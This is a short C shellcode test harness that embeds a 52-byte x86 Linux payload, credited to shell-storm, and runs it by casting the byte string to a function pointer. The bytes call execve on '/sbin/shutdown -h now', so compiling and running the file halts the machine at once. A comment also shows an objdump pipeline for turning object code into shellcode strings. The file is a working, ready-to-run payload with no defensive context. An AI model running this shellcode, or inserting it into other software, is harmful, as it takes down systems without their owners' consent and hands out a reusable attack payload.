#include<stdio.h>
#include<string.h>

/* objdump -d ./shutdown.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' */

// http://shell-storm.org/shellcode/files/shellcode-876.php

// size = 52 bytes

unsigned char code[] = \
"\x31\xc0\x99\x52\x6a\x77\x66\x68\x6e\x6f\x89\xe6\x52\x66\x68\x2d\x68\x89\xe7\x52\x68\x64\x6f\x77\x6e\x68\x73\x68\x75\x74\x68\x6e\x2f\x2f\x2f\x68\x2f\x73\x62\x69\x89\xe3\xb0\x0b\x52\x56\x57\x53\x89\xe1\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();

	return 0;

}

	
